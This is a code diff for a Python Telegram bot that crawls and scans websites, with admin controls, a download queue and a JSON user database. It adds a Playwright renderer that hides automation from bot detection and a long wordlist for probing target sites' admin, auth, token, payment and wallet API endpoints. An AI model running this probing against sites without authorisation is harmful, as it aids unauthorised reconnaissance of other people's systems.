+        f"⚡ Active Scans: `{active_scans}/{MAX_WORKERS}` | Queue cap: `{QUEUE_MAX}`\n\n"
+        f"👥 Users: `{tu}` | 🚫 Banned: `{banned_n}`\n"
+        f"📦 Total DL: `{tdl}` | 📅 Today: `{today_dl}`\n"
+        f"🌐 Proxy: `{proxy_live}/{proxy_total}` live | "
+        f"📏 Limit: `{limit}/day`"
+    )
+
     kb = [
         [
-            InlineKeyboardButton("👥 Users",   callback_data="adm_users"),
-            InlineKeyboardButton("📊 Stats",   callback_data="adm_stats"),
+            InlineKeyboardButton("👥 Users",      callback_data="adm_users"),
+            InlineKeyboardButton("📊 Stats",      callback_data="adm_stats"),
         ],
         [
-            InlineKeyboardButton("⚙️ Settings", callback_data="adm_settings"),
+            InlineKeyboardButton("⚙️ Settings",   callback_data="adm_settings"),
+            InlineKeyboardButton("🌐 Proxy",      callback_data="adm_proxy"),
+        ],
+        [
+            InlineKeyboardButton("📡 Active Scans", callback_data="adm_active"),
+            InlineKeyboardButton("📜 Log",        callback_data="adm_log"),
+        ],
+        [
+            InlineKeyboardButton("📢 Broadcast",  callback_data="adm_broadcast_prompt"),
+            InlineKeyboardButton("🚫 Ban User",   callback_data="adm_ban_prompt"),
+        ],
+        [
             InlineKeyboardButton(
-                "🔴 Bot OFF" if bot_on else "🟢 Bot ON",
+                f"{'🔴 Bot OFF' if bot_on else '🟢 Bot ON'}",
                 callback_data="adm_toggle_bot"
             ),
+            InlineKeyboardButton("🛑 Kill All Tasks", callback_data="adm_killall"),
         ],
-        [InlineKeyboardButton("📜 Downloads Log", callback_data="adm_log")]
     ]
-    text = (
-        f"👑 *Admin Panel v17.0*\n\n"
-        f"👥 Users: `{escape_md(tu)}` | 🚫 Banned: `{escape_md(banned_n)}`\n"
-        f"📦 Total: `{escape_md(tdl)}` | Today: `{escape_md(today_dl)}`\n"
-        f"Bot: {'🟢 ON' if bot_on else '🔴 OFF'}\n"
-        f"⚡ Concurrent: `{escape_md(MAX_WORKERS)}` | Limit: `{db['settings']['global_daily_limit']}`\n"
-        f"🔒 SSRF/Traversal/RateLimit: ✅\n"
-        f"JS: {'✅' if PLAYWRIGHT_OK else '❌'}"
-    )
+
     markup = InlineKeyboardMarkup(kb)
     try:
         if hasattr(target, 'edit_message_text'):
             await target.edit_message_text(text, reply_markup=markup, parse_mode='Markdown')
         else:
             await target.reply_text(text, reply_markup=markup, parse_mode='Markdown')
-    except BadRequest: pass
+    except BadRequest:
+        pass
 
 @admin_only
 
@@ -18471,6 +19257,4116 @@ async def cmd_setproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # 🔒  SECURITY LAYER 5 — Admin Auth Hardened
 # ══════════════════════════════════════════════════
 
+async def verify_admin(update: Update) -> bool:
+    """
+    Admin verification — multi-layer check
+    """
+    uid = update.effective_user.id
+
+    # Layer 1: ID check
+    if uid not in ADMIN_IDS:
+        return False
+
+    # Layer 2: Private chat only (admin commands in group = dangerous)
+    if update.effective_chat.type != "private":
+        await update.effective_message.reply_text(
+            "⚠️ Admin commands ကို private chat မှာသာ သုံးနိုင်ပါတယ်"
+        )
+        return False
+
+    # Layer 3: Not a forwarded message (anti-spoofing)
+    # forward_origin = newer PTB | forward_date = older PTB version
+    if update.message:
+        is_forwarded = (
+            getattr(update.message, 'forward_origin', None) or
+            getattr(update.message, 'forward_date', None)
+        )
+        if is_forwarded:
+            return False
+
+    return True
+
+def admin_only(func):
+    @functools.wraps(func)
+    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await verify_admin(update):
+            # ── Admin command — user မြင်ရင်မကောင်းဘူး — silent ignore ──
+            return
+        return await func(update, context)
+    return wrapper
+
+
+# ══════════════════════════════════════════════════
+# 🚨  ADMIN ERROR NOTIFY — Unhandled error → Admin DM
+# ══════════════════════════════════════════════════
+
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Global error handler — Admin ဆီ Telegram message ပို့မည်"""
+    import traceback
+    tb = "".join(traceback.format_exception(
+        type(context.error), context.error, context.error.__traceback__
+    ))
+    short_tb = tb[-1500:] if len(tb) > 1500 else tb   # Telegram 4096 char limit
+
+    # User info (if available)
+    user_info = ""
+    if update and hasattr(update, "effective_user") and update.effective_user:
+        u = update.effective_user
+        user_info = f"\n👤 User: `{escape_md(u.id)}` ({u.first_name})"
+
+    # Escape traceback to avoid breaking Markdown code-block entity
+    safe_tb = short_tb.replace('`', "'")
+    msg = (
+        "🚨 *Bot Error Alert*\n"
+        f"━━━━━━━━━━━━━━━━━━━━{escape_md(user_info)}\n\n"
+        f"```\n{safe_tb}\n```"
+    )
+
+    for admin_id in ADMIN_IDS:
+        try:
+            await safe_markdown_send(
+                context.bot,
+                chat_id=admin_id,
+                text=msg,
+            )
+        except Exception:
+            logger.warning("Admin error notify failed for %d", admin_id)
+
+    logger.error("Unhandled exception: %s", context.error, exc_info=context.error)
+
+
+# ══════════════════════════════════════════════════
+# 🗑️  AUTO-DELETE — Expired download files cleaner
+# ══════════════════════════════════════════════════
+
+async def auto_delete_loop():
+    """Background task — ၂၄ နာရီ (FILE_EXPIRY_HOURS) ကြာတဲ့ ZIP files auto-delete"""
+    while True:
+        try:
+            now     = time.time()
+            deleted = 0
+            freed   = 0.0
+            for folder in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
+                for root, dirs, files in os.walk(folder):
+                    for fname in files:
+                        fpath = os.path.join(root, fname)
+                        try:
+                            age_hours = (now - os.path.getmtime(fpath)) / 3600
+                            if age_hours >= FILE_EXPIRY_HOURS:
+                                size = os.path.getsize(fpath) / 1024 / 1024
+                                os.remove(fpath)
+                                deleted += 1
+                                freed   += size
+                        except Exception:
+                            pass
+            if deleted:
+                logger.info(
+                    "Auto-delete: %d files | %.1f MB freed (>%dh old)",
+                    deleted, freed, FILE_EXPIRY_HOURS
+                )
+        except Exception as e:
+            logger.warning("Auto-delete loop error: %s", e)
+        # ၁ နာရီတစ်ကြိမ် check
+        await asyncio.sleep(3600)
+
+
+# ══════════════════════════════════════════════════
+# 📋  QUEUE SYSTEM — Download request queue
+# ══════════════════════════════════════════════════
+
+async def queue_worker():
+    """Background worker — queue ထဲက download request တွေ တစ်ခုစီ run"""
+    global _dl_queue
+    while True:
+        try:
+            task = await _dl_queue.get()
+            update, context, url, full_site, use_js, resume_mode, uid = task
+            # Remove from position tracker
+            _queue_pos.pop(uid, None)
+            try:
+                await _run_download(update, context, url, full_site, use_js, resume_mode)
+            except Exception as e:
+                logger.error("Queue worker download error: %s", e)
+            finally:
+                _dl_queue.task_done()
+        except Exception as e:
+            logger.error("Queue worker error: %s", e)
+            await asyncio.sleep(1)
+
+
+async def enqueue_download(
+    update: Update, context: ContextTypes.DEFAULT_TYPE,
+    url: str, full_site: bool, use_js: bool, resume_mode: bool = False
+):
+    """Download request ကို queue ထဲ ထည့်သည်"""
+    global _dl_queue
+    uid = update.effective_user.id
+
+    if _dl_queue.qsize() >= QUEUE_MAX:
+        await update.effective_message.reply_text(
+            f"⚠️ Queue ပြည့်နေပါတယ် (`{escape_md(QUEUE_MAX)}` max)\n"
+            "ခဏနေပြီးမှ ထပ်ကြိုးစားပါ",
+            parse_mode='Markdown'
+        )
+        return
+
+    await _dl_queue.put((update, context, url, full_site, use_js, resume_mode, uid))
+    pos = _dl_queue.qsize()
+    _queue_pos[uid] = pos
+
+    if pos > 1:
+        await update.effective_message.reply_text(
+            f"📋 *Queue ထဲ ထည့်ပြီးပါပြီ*\n"
+            f"📍 Position: `{escape_md(pos)}`\n"
+            f"⏳ Download ရောက်လာသည့်အခါ အလိုအလျောက် စမည်",
+            parse_mode='Markdown'
+        )
+
+
+# ══════════════════════════════════════════════════
+# 📦  DATABASE  (with async lock for race condition)
+# ══════════════════════════════════════════════════
+
+def _load_db_sync() -> dict:
+    if os.path.exists(DB_FILE):
+        try:
+            with open(DB_FILE, 'r', encoding='utf-8') as f:
+                return json.load(f)
+        except Exception:
+            pass
+    return {
+        "users": {},
+        "settings": {
+            "global_daily_limit": DAILY_LIMIT,
+            "max_pages": MAX_PAGES,
+            "max_assets": MAX_ASSETS,
+            "bot_enabled": True
+        }
+    }
+
+def _save_db_sync(db: dict):
+    # Atomic write — temp file → rename
+    tmp = DB_FILE + ".tmp"
+    with open(tmp, 'w', encoding='utf-8') as f:
+        json.dump(db, f, ensure_ascii=False, indent=2)
+    os.replace(tmp, DB_FILE)  # atomic on most OS
+
+async def db_read() -> dict:
+    """Thread-safe DB read (non-blocking)"""
+    loop = asyncio.get_event_loop()
+    async with db_lock:
+        return await loop.run_in_executor(None, _load_db_sync)
+
+async def db_write(db: dict):
+    """Thread-safe DB write (non-blocking)"""
+    loop = asyncio.get_event_loop()
+    async with db_lock:
+        await loop.run_in_executor(None, _save_db_sync, db)
+
+async def db_update(func):
+    """
+    Thread-safe atomic DB update (non-blocking)
+    Usage: await db_update(lambda db: db["users"][uid].update(...))
+    """
+    loop = asyncio.get_event_loop()
+    async with db_lock:
+        db = await loop.run_in_executor(None, _load_db_sync)
+        func(db)
+        await loop.run_in_executor(None, _save_db_sync, db)
+        return db
+
+def get_user(db: dict, user_id: int, name: str = "") -> dict:
+    uid = str(user_id)
+    if uid not in db["users"]:
+        db["users"][uid] = {
+            "name": name, "banned": False,
+            "daily_limit": None, "count_today": 0,
+            "last_date": "", "total_downloads": 0,
+            "downloads": []
+        }
+    if name:
+        db["users"][uid]["name"] = name
+    return db["users"][uid]
+
+def reset_daily(user: dict):
+    today = str(date.today())
+    if user["last_date"] != today:
+        user["count_today"] = 0
+        user["last_date"] = today
+
+def get_limit(db: dict, user: dict) -> int:
+    return user["daily_limit"] if user["daily_limit"] is not None\
+           else db["settings"]["global_daily_limit"]
+
+def can_download(db: dict, user: dict) -> bool:
+    reset_daily(user)
+    lim = get_limit(db, user)
+    return lim == 0 or user["count_today"] < lim
+
+def log_download(user: dict, url: str, size_mb: float, status: str):
+    user["downloads"].append({
+        "url": sanitize_log_url(url),       # ← sanitized before storing
+        "time": datetime.now().strftime("%Y-%m-%d %H:%M"),
+        "size_mb": round(size_mb, 2),
+        "status": status
+    })
+    if len(user["downloads"]) > 100:
+        user["downloads"] = user["downloads"][-100:]
+    user["count_today"] += 1
+    user["total_downloads"] += 1
+
+
+# ══════════════════════════════════════════════════
+# 💾  RESUME STATE  (with HMAC integrity)
+# ══════════════════════════════════════════════════
+
+def _state_sig(state: dict) -> str:
+    data = json.dumps({k: v for k, v in state.items() if k != "_sig"}, sort_keys=True)
+    return hmac.HMAC(SECRET_KEY.encode(), data.encode(), hashlib.sha256).hexdigest()
+
+def _resume_path(url: str) -> str:
+    return os.path.join(RESUME_DIR, hashlib.md5(url.encode()).hexdigest()[:12] + ".json")
+
+def load_resume(url: str) -> dict:
+    path = _resume_path(url)
+    empty = {"visited": [], "downloaded": [], "assets": [], "stats": {}}
+    if not os.path.exists(path):
+        return empty
+    try:
+        with open(path) as f:
+            state = json.load(f)
+        sig = state.pop("_sig", "")
+        if not hmac.compare_digest(_state_sig(state), sig):
+            logger.warning("Resume state integrity check FAILED — ignoring")
+            os.remove(path)
+            return empty
+        return state
+    except Exception:
+        return empty
+
+def save_resume(url: str, state: dict):
+    to_save = dict(state)
+    to_save["_sig"] = _state_sig(state)
+    tmp = _resume_path(url) + ".tmp"
+    with open(tmp, 'w') as f:
+        json.dump(to_save, f)
+    os.replace(tmp, _resume_path(url))
+
+def clear_resume(url: str):
+    p = _resume_path(url)
+    if os.path.exists(p):
+        os.remove(p)
+
+
+# ══════════════════════════════════════════════════
+# 📊  PROGRESS BAR (Upgraded for Telegram)
+# ══════════════════════════════════════════════════
+
+def pbar(done: int, total: int, width: int = 18) -> str:
+    """Telegram တွင် ပိုမိုသပ်ရပ်ချောမွေ့စွာ ပြသပေးမည့် Progress Bar"""
+    if total <= 0:
+        return "│" + " " * width + "│   0%"
+    
+    pct = min(max(done / total, 0.0), 1.0)
+    fill_exact = pct * width
+    full_blocks = int(fill_exact)
+    remainder = fill_exact - full_blocks
+
+    partials = [" ", "▏", "▎", "▍", "▌", "▋", "▊", "▉"]
+    
+    bar = "█" * full_blocks
+    if full_blocks < width:
+        bar += partials[int(remainder * len(partials))]
+        bar += " " * (width - full_blocks - 1)
+
+    pct_str = f"{int(pct * 100):>3}%"
+    return f"│{bar}│ {pct_str}"
+
+# ══════════════════════════════════════════════════
+# 🌐  JS RENDERER  (Playwright — Python native)
+# ══════════════════════════════════════════════════
+
+def fetch_with_playwright(url: str) -> str | None:
+    """
+    Playwright ဖြင့် JS render လုပ်ပြီး HTML ထုတ်ပေးသည်။
+    SECURITY: URL validate ပြီးမှသာ browser ဖွင့်သည်။
+    """
+    if not PLAYWRIGHT_OK:
+        return None
+
+    safe, reason = is_safe_url(url)
+    if not safe:
+        logger.warning(f"Playwright blocked unsafe URL: {reason}")
+        return None
+
+    if not re.match(r'^https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&\'()*+,;=%]+$', url):
+        logger.warning("Playwright blocked URL with invalid characters")
+        return None
+
+    try:
+        from playwright.sync_api import sync_playwright
+        with sync_playwright() as pw:
+            browser = pw.chromium.launch(
+                headless=True,
+                args=["--no-sandbox", "--disable-dev-shm-usage",
+                      "--disable-blink-features=AutomationControlled", "--disable-gpu"]
+            )
+            ctx = browser.new_context(
+                user_agent=(
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                    "AppleWebKit/537.36 (KHTML, like Gecko) "
+                    "Chrome/122.0.0.0 Safari/537.36"
+                ),
+                viewport={"width": 1366, "height": 768},
+                ignore_https_errors=True,
+            )
+            ctx.add_init_script(
+                "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"
+                "window.chrome={runtime:{}};"
+            )
+            page = ctx.new_page()
+            try:
+                page.goto(url, wait_until="networkidle", timeout=40_000)
+            except Exception:
+                try:
+                    page.goto(url, wait_until="load", timeout=25_000)
+                except Exception:
+                    pass
+            html = page.content()
+            browser.close()
+            return html if html and html.strip() else None
+    except Exception as e:
+        logger.warning(f"Playwright exception: {type(e).__name__}: {e}")
+        return None
+
+def fetch_page(url: str, use_js: bool = False) -> tuple:
+    """Returns: (html | None, js_used: bool)"""
+    if use_js:
+        html = fetch_with_playwright(url)
+        if html:
+            return html, True
+        log_info(f"JS fallback to requests: {sanitize_log_url(url)}")
+
+    try:
+        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
+        resp.raise_for_status()
+        ct = resp.headers.get('Content-Type', '')
+        if 'text/html' not in ct:
+            return None, False
+        return resp.text, False
+    except Exception as e:
+        log_warn(url, f"fetch error: {type(e).__name__}")
+        return None, False
+
+
+# ══════════════════════════════════════════════════
+# 🔍  ASSET EXTRACTORS
+# ══════════════════════════════════════════════════
+
+def extract_assets(html: str, page_url: str) -> set:
+    soup   = BeautifulSoup(html, 'html.parser')
+    assets = set()
+
+    # ── Standard links / scripts ──────────────────
+    for tag in soup.find_all('link', href=True):
+        assets.add(urljoin(page_url, tag['href']))
+    for tag in soup.find_all('script', src=True):
+        assets.add(urljoin(page_url, tag['src']))
+
+    # ── Images (all lazy-load attrs) ──────────────
+    LAZY_ATTRS = (
+        'src','data-src','data-lazy','data-original','data-lazy-src',
+        'data-srcset','data-original-src','data-hi-res-src',
+        'data-full-src','data-image','data-img','data-bg',
+        'data-background','data-poster','data-thumb',
+    )
+    for tag in soup.find_all('img'):
+        for attr in LAZY_ATTRS:
+            v = tag.get(attr, '')
+            if v and not v.startswith('data:'):
+                assets.add(urljoin(page_url, v))
+        for part in tag.get('srcset', '').split(','):
+            u = part.strip().split(' ')[0]
+            if u: assets.add(urljoin(page_url, u))
+
+    # ── Video / Audio / Media ─────────────────────
+    for tag in soup.find_all(['video', 'audio', 'source', 'track']):
+        for attr in ('src', 'data-src', 'poster'):
+            v = tag.get(attr, '')
+            if v: assets.add(urljoin(page_url, v))
+    # <video> direct src
+    for tag in soup.find_all('video', src=True):
+        assets.add(urljoin(page_url, tag['src']))
+    # iframe embeds (video players)
+    for tag in soup.find_all('iframe', src=True):
+        s = tag['src']
+        if any(x in s for x in ('youtube','vimeo','player','embed','video')):
+            assets.add(urljoin(page_url, s))
+
+    # ── Downloadable files ────────────────────────
+    FILE_EXTS = (
+        '.pdf','.zip','.rar','.7z','.tar','.gz',
+        '.doc','.docx','.xls','.xlsx','.ppt','.pptx',
+        '.mp3','.mp4','.avi','.mkv','.mov','.webm',
+        '.apk','.exe','.dmg','.iso',
+    )
+    for tag in soup.find_all('a', href=True):
+        h = tag['href']
+        full = urljoin(page_url, h)
+        low  = full.lower().split('?')[0]
+        if any(low.endswith(ext) for ext in FILE_EXTS):
+            assets.add(full)
+
+    # ── CSS inline / style tag ────────────────────
+    for tag in soup.find_all(style=True):
+        for u in re.findall(r'url\(["\']?(.+?)["\']?\)', tag['style']):
+            if not u.startswith('data:'): assets.add(urljoin(page_url, u))
+    for st in soup.find_all('style'):
+        css = st.string or ''
+        for u in re.findall(r'url\(["\']?(.+?)["\']?\)', css):
+            if not u.startswith('data:'): assets.add(urljoin(page_url, u))
+        for u in re.findall(r'@import\s+["\'](.+?)["\']', css):
+            assets.add(urljoin(page_url, u))
+
+    # ── Meta tags (OG image etc) ──────────────────
+    for tag in soup.find_all('meta'):
+        prop = tag.get('property', '') + tag.get('name', '')
+        if any(k in prop.lower() for k in ('image','thumbnail','banner','icon')):
+            c = tag.get('content', '')
+            if c.startswith('http'): assets.add(c)
+
+    # ── Object / Embed ────────────────────────────
+    for tag in soup.find_all(['object', 'embed']):
+        v = tag.get('data', '') or tag.get('src', '')
+        if v: assets.add(urljoin(page_url, v))
+
+    # ── Regex sweep: static files in raw HTML/JS ──
+    for m in re.finditer(
+        r'["\']((https?://|/)[^"\'<>\s]+\.(js|css|woff2?|ttf|otf|eot'
+        r'|png|jpg|jpeg|gif|svg|webp|avif|ico'
+        r'|mp4|webm|mp3|ogg|wav'
+        r'|pdf|zip|apk)(\?[^"\'<>\s]*)?)["\']',
+        html, re.IGNORECASE
+    ):
+        u = m.group(1)
+        if u.startswith('/'):
+            u = urljoin(page_url, u)
+        assets.add(u)
+
+    # ── JSON-LD / structured data images ─────────
+    for tag in soup.find_all('script', type='application/ld+json'):
+        txt = tag.string or ''
+        for m in re.finditer(r'"(https?://[^"]+\.(jpg|jpeg|png|webp|gif|svg))"', txt):
+            assets.add(m.group(1))
+
+    return assets
+
+
+def extract_css_assets(css: str, css_url: str) -> set:
+    assets = set()
+    for u in re.findall(r'url\(["\']?(.+?)["\']?\)', css):
+        u = u.strip().strip('"\'')
+        if u and not u.startswith('data:') and not u.startswith('#'):
+            assets.add(urljoin(css_url, u))
+    for u in re.findall(r'@import\s+["\'](.+?)["\']', css):
+        assets.add(urljoin(css_url, u))
+    return assets
+
+
+def extract_media_from_js(js_content: str, base_url: str) -> set:
+    """
+    Mine JS/JSON files for media URLs.
+    Useful for React/Vue apps that store image paths in JS bundles.
+    """
+    assets = set()
+    # Full URLs
+    for m in re.finditer(
+        r'["\`](https?://[^"\'`<>\s]{8,}\.(?:jpg|jpeg|png|gif|webp|avif|svg|mp4|webm|mp3|pdf))["\`]',
+        js_content, re.IGNORECASE
+    ):
+        assets.add(m.group(1))
+    # Relative paths
+    for m in re.finditer(
+        r'["\`](/[^"\'`<>\s]{3,}\.(?:jpg|jpeg|png|gif|webp|avif|svg|mp4|webm|mp3|pdf))["\`]',
+        js_content, re.IGNORECASE
+    ):
+        assets.add(urljoin(base_url, m.group(1)))
+    return assets
+
+
+# ══════════════════════════════════════════════════
+# 🗺️  SITEMAP PARSER
+# ══════════════════════════════════════════════════
+
+def fetch_sitemap(base_url: str) -> set:
+    """
+    Fetch sitemap.xml (and sitemap index) — returns all page URLs.
+    Supports: /sitemap.xml, /sitemap_index.xml, /robots.txt discovery
+    """
+    urls   = set()
+
+    def _fetch_one_sitemap(url: str, depth: int = 0):
+        if depth > 3:   # FIX: recursion depth limit
+            return
+        try:
+            r = requests.get(url, headers=_get_headers(), timeout=15, verify=False, proxies=proxy_manager.get_proxy())
+            if r.status_code != 200:
+                return
+            text = r.text
+            # Sitemap index → recurse
+            if '<sitemapindex' in text:
+                for m in re.finditer(r'<loc>\s*(https?://[^<]+)\s*</loc>', text):
+                    sub = m.group(1).strip()
+                    if sub not in urls:
+                        _fetch_one_sitemap(sub, depth + 1)
+            else:
+                for m in re.finditer(r'<loc>\s*(https?://[^<]+)\s*</loc>', text):
+                    urls.add(m.group(1).strip())
+        except Exception:
+            pass
+
+    # Try common sitemap locations
+    parsed = urlparse(base_url)
+    root   = f"{parsed.scheme}://{parsed.netloc}"
+
+    # Check robots.txt for sitemap pointer first
+    try:
+        r = requests.get(f"{root}/robots.txt", headers=HEADERS,
+                         timeout=8, verify=False,
+                         proxies=proxy_manager.get_proxy())
+        if r.status_code == 200:
+            for m in re.finditer(r'(?i)sitemap:\s*(https?://\S+)', r.text):
+                _fetch_one_sitemap(m.group(1).strip())
+    except Exception:
+        pass
+
+    if not urls:
+        for path in ['/sitemap.xml', '/sitemap_index.xml',
+                     '/sitemap/sitemap.xml', '/wp-sitemap.xml',
+                     '/news-sitemap.xml', '/post-sitemap.xml',
+                     '/page-sitemap.xml', '/product-sitemap.xml']:
+            _fetch_one_sitemap(root + path)
+
+    # Filter to same domain only
+    netloc = parsed.netloc
+    return {u for u in urls if urlparse(u).netloc == netloc}
+
+
+# ══════════════════════════════════════════════════
+# 🔌  API ENDPOINT DISCOVERY
+# ══════════════════════════════════════════════════
+
+# Common API paths for e-commerce + news/blog sites
+_API_PATHS_ECOMMERCE = [
+    # General Ecommerce
+    '/api/products', '/api/v1/products', '/api/v2/products',
+    '/api/categories', '/api/v1/categories',
+    '/api/items', '/api/inventory',
+    '/api/cart', '/api/orders', '/api/v1/orders',
+    '/api/checkout', '/api/payments', '/api/shipping', # Added checkout & payments
+    '/api/search', '/api/v1/search',
+    '/api/users', '/api/v1/users', '/api/customers',   # Added customers
+    '/api/config', '/api/settings',
+    
+    # WooCommerce REST API
+    '/wp-json/wc/v3/products', '/wp-json/wc/v3/categories',
+    '/wp-json/wc/v3/orders', '/wp-json/wc/v3/customers',
+    '/wp-json/wc/v2/products', '/wp-json/wc/v2/orders',
+    
+    # Magento
+    '/rest/V1/products', '/rest/V1/categories', '/rest/V1/orders',
+    '/rest/default/V1/products',
+    
+    # GraphQL
+    '/graphql', '/api/graphql', '/v1/graphql', '/graphql/schema.json',
+    
+    # Shopify
+    '/products.json', '/collections.json', '/pages.json',
+    '/collections/all/products.json', '/admin/api/2023-10/products.json',
+    
+    # General Base
+    '/api', '/api/v1', '/api/v2', '/api/v3',
+    '/rest/v1', '/rest/api',
+]
+
+_API_PATHS_NEWS = [
+    # WordPress REST API
+    '/wp-json/wp/v2/posts', '/wp-json/wp/v2/pages',
+    '/wp-json/wp/v2/categories', '/wp-json/wp/v2/tags',
+    '/wp-json/wp/v2/media', '/wp-json/wp/v2/users', '/wp-json',
+    
+    # General news APIs
+    '/api/articles', '/api/posts', '/api/news', '/api/blogs',
+    '/api/v1/articles', '/api/v1/posts', '/api/v2/posts',
+    
+    # Feeds & Sitemaps
+    '/api/feed', '/feed.json', '/feed/json',
+    '/rss', '/rss.xml', '/feed', '/feed.rss',
+    '/atom.xml', '/sitemap.xml', '/sitemap_index.xml', '/sitemap-news.xml',
+    
+    # Ghost CMS
+    '/ghost/api/v4/content/posts/', '/ghost/api/v3/content/posts/',
+    
+    # Strapi
+    '/api/articles?populate=*', '/api/posts?populate=*',
+    
+    # Drupal JSON:API
+    '/jsonapi/node/article', '/jsonapi/node/page',
+]
+
+_API_PATHS_GENERAL = [
+    # Health & Info
+    '/api/health', '/api/status', '/health', '/ping', '/healthcheck',
+    '/version', '/api/version', '/info', '/api/info',
+    
+    # Documentation & Swagger
+    '/.well-known/openapi.json', '/openapi.json', '/openapi.yaml',
+    '/swagger.json', '/swagger.yaml', '/api-docs', '/swagger-ui.html',
+    '/docs', '/api/docs', '/redoc', '/api/redoc',
+    
+    # Well-known & Discovery
+    '/.well-known/security.txt', '/.well-known/core-config',
+]
+
+# ----------------- အသစ်ထပ်တိုးထားသောအပိုင်းများ ----------------- #
+
+_API_PATHS_AUTH = [
+    # Login & Authentication
+    '/api/login', '/api/v1/login', '/api/auth', '/api/v1/auth',
+    '/api/auth/login', '/api/users/login', '/api/admin/login',
+    '/api/register', '/api/v1/register', '/api/auth/register', '/api/signup',
+    
+    # Tokens (JWT, OAuth)
+    '/api/token', '/api/v1/token', '/oauth/token', '/oauth2/token',
+    '/api/refresh', '/api/token/refresh', '/api/auth/refresh',
+    
+    # Current User Profile & Logout
+    '/api/me', '/api/v1/me', '/api/user', '/api/current_user',
+    '/api/logout', '/api/auth/logout',
+    
+    # WordPress Specific Auth Plugins (JWT Authentication)
+    '/wp-json/jwt-auth/v1/token', '/wp-json/aam/v2/authenticate',
+]
+
+_API_PATHS_ADMIN = [
+    # Admin Panels & Dashboards
+    '/api/admin', '/api/v1/admin', '/admin/api',
+    '/api/dashboard', '/api/system', '/api/config', '/api/settings',
+    '/api/admin/users', '/api/admin/settings',
+    '/admin/dashboard.json', '/api/stats', '/api/metrics',
+    
+    # Spring Boot Actuator (Java)
+    '/actuator/health', '/actuator/info', '/manage/health', '/manage/info'
+]
+
+# ── API paths တိုးချဲ့ ────────────────────────────
+_API_PATHS_MOBILE = [
+    # Mobile / App APIs
+    '/api/v1/app', '/api/v2/app', '/api/mobile',
+    '/api/v1/config', '/api/v2/config',
+    '/api/notifications', '/api/v1/notifications',
+    '/api/v1/feed', '/api/v2/feed',
+    '/api/social', '/api/friends', '/api/followers',
+    '/api/messages', '/api/v1/messages',
+    '/api/upload', '/api/media', '/api/files',
+    '/api/analytics', '/api/events', '/api/tracking',
+]
+
+_API_PATHS_FINANCE = [
+    # Fintech / Payment / Crypto
+    '/api/payments', '/api/v1/payments', '/api/transactions',
+    '/api/wallet', '/api/balance', '/api/withdraw', '/api/deposit',
+    '/api/exchange', '/api/rates', '/api/currency',
+    '/api/invoice', '/api/billing', '/api/subscriptions',
+    '/api/v1/subscriptions', '/api/plans',
+    '/api/crypto', '/api/coins', '/api/market',
+    '/api/accounts', '/api/v1/accounts', '/api/v2/accounts',
+]
+
+_API_PATHS_SAAS = [
+    # SaaS / Dashboard
+    '/api/workspaces', '/api/projects', '/api/teams',
+    '/api/members', '/api/invitations', '/api/roles',
+    '/api/reports', '/api/exports', '/api/imports',
+    '/api/webhooks', '/api/integrations', '/api/plugins',
+    '/api/audit', '/api/logs', '/api/activity',
+    # Laravel / Sanctum / Passport
+    '/api/csrf-cookie', '/api/user', '/sanctum/csrf-cookie',
+    '/oauth/authorize', '/oauth/clients', '/oauth/personal-access-tokens',
+    # Django REST Framework
+    '/api/schema/', '/api/schema/swagger-ui/', '/api/schema/redoc/',
+    # FastAPI / Starlette
+    '/docs', '/redoc', '/openapi.json',
+    # Next.js API routes
+    '/api/_next', '/api/auth/[...nextauth]', '/api/auth/session',
+    '/api/auth/csrf', '/api/auth/providers',
+    # Supabase / Firebase-style
+    '/rest/v1/', '/auth/v1/', '/storage/v1/',
+]
+
+ALL_API_PATHS = list(dict.fromkeys(
+    _API_PATHS_ECOMMERCE +
+    _API_PATHS_NEWS      +
+    _API_PATHS_GENERAL   +
+    _API_PATHS_AUTH      +   # ← Fix: ပါမနေတာ ထည့်
+    _API_PATHS_ADMIN     +   # ← Fix: ပါမနေတာ ထည့်
+    _API_PATHS_MOBILE    +
+    _API_PATHS_FINANCE   +
+    _API_PATHS_SAAS
+))
+
+
+# ── API URL patterns in JS bundles ─────────────
+_JS_API_PATTERNS = [
+    re.compile(r"""(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*['"`]([^'"`\s]{5,200})['"`]"""),
+    re.compile(r"""(?:url|endpoint|baseURL|apiUrl|API_URL)\\s*[:=]\\s*['"`]([^'"`\\s]{5,200})['"`]"""),
+    re.compile(r"""['"`](/api/[^\\s'"`\\?#]{3,100})['"`]"""),
+    re.compile(r"""['"`](/rest/[^\\s'"`\\?#]{3,100})['"`]"""),
+    re.compile(r"""['"`](/v\\d+/[^\\s'"`\\?#]{3,100})['"`]"""),
+    re.compile(r"['\"`](https?://[^\s'\"` ]{10,200}/api/[^\s'\"` ?#]{2,100})['\"`]"),
+]
+
+def _extract_api_urls_from_js(js_text: str, base_root: str) -> list:
+    """JS bundle/source ထဲက API URL တွေ mine လုပ်"""
+    found = set()
+    for pat in _JS_API_PATTERNS:
+        for m in pat.findall(js_text):
+            url = m.strip()
+            if not url or len(url) < 4:
+                continue
+            if url.startswith('/'):
+                url = base_root + url
+            if url.startswith('http') and '/api/' not in url and '/rest/' not in url and '/v' not in url:
+                continue
+            if url.startswith('http') or url.startswith('/'):
+                found.add(url)
+    return list(found)
+
+
+def _extract_api_urls_from_html(html: str, base_root: str) -> list:
+    """HTML source ထဲက API references mine လုပ်"""
+    found = set()
+    soup  = BeautifulSoup(html, 'html.parser')
+
+    # data-* attributes
+    for tag in soup.find_all(True):
+        for attr, val in tag.attrs.items():
+            if isinstance(val, str) and ('/api/' in val or '/rest/' in val):
+                if val.startswith('/') or val.startswith('http'):
+                    url = (base_root + val) if val.startswith('/') else val
+                    found.add(url.split('?')[0])
+
+    # Inline scripts
+    for script in soup.find_all('script'):
+        if script.string:
+            for url in _extract_api_urls_from_js(script.string, base_root):
+                found.add(url.split('?')[0])
+
+    # <link rel="..."> and <a href="..."> with /api/
+    for tag in soup.find_all(['link', 'a'], href=True):
+        href = tag['href']
+        if '/api/' in href or '/graphql' in href:
+            url = (base_root + href) if href.startswith('/') else href
+            found.add(url.split('?')[0])
+
+    return list(found)
+
+
